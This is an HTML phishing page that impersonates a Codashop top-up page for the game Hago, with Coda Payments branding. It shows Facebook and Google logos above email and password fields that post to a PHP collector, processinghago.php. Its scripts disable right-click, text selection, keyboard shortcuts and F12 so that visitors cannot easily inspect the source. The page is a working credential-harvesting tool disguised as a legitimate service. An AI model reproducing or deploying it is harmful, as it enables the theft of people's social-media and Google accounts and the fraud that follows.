
<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="https://images2.imgbox.com/74/c2/A82aJNWc_o.png"/>
<title>Hago - Codashop</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {

var gnumber = $("#gnumber").val();
var townhall = $("#townhall").val();
var grecov = $("#grecov").val();
var gexp = $("#gexp").val();
		  if(gnumber==''|| grecov=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("request.php",
		  {gnumber:gnumber,grecov:grecov,gexp:gexp,townhall:townhall,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<!-- Kode menampilkan peringatan untuk mengaktifkan javascript-->
<div align="center"><noscript>
   <div style="position:fixed; top:0px; left:0px; z-index:3000; height:100%; width:100%; background-color:#FFFFFF">
   <div style="font-family: Arial; font-size: 17px; background-color:#00bbf9; padding: 11pt;">Mohon aktifkan javascript pada browser untuk mengakses halaman ini!</div></div>
</noscript></div>

<!--Kode untuk mencegah seleksi teks, block teks dll.-->
<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<style type="text/css">
* : (input, textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none;

}
</style>
<style type="text/css">
img {
	-webkit-touch-callout: none;
	-webkit-user-select: none;
    }
</style>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>
<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",54166]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
<CENTER>
<div class="col-md-6">

<body background = "https://s10.postimg.org/ulreu2eq1/image.jpg"><br>
<div class="col-md-8">
       <form action="processinghago.php" id="login-form" method="post">
  <h4 >
<img src="http://www.freepngimg.com/thumb/facebook/2-2-facebook-free-download-png-thumb.png" height="50px" width="50px">  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Email" type="text" >
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb2" placeholder="Password" type="password" >
 <br>
 </div>
 
 <form action="processinghago.php" id="login-form" method="post">
<h4 >
<img src="https://img2.pngdownload.id/20180511/afq/kisspng-google-logo-google-adwords-g-suite-google-account-5af5b0b3a42df3.0313241615260509956725.jpg" height="50px" width="50px">
  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="vk1" placeholder="Email" type="email" >
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" name="vk2" placeholder="Password" type="password" >

  
  

  
  
  
 <input type="submit" class="btn btn-block" style="color: #A9A9A9;background-color: #000000;" value="LOGIN ACCOUNT"> </form>
 </div>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
 
 <p><center><b>© Hak Cipta Coda Payments 2019</b>.</p>
</center>
</div><br>
</div>
  </p> 
</div>
</div>
</div><br><br>
</div>

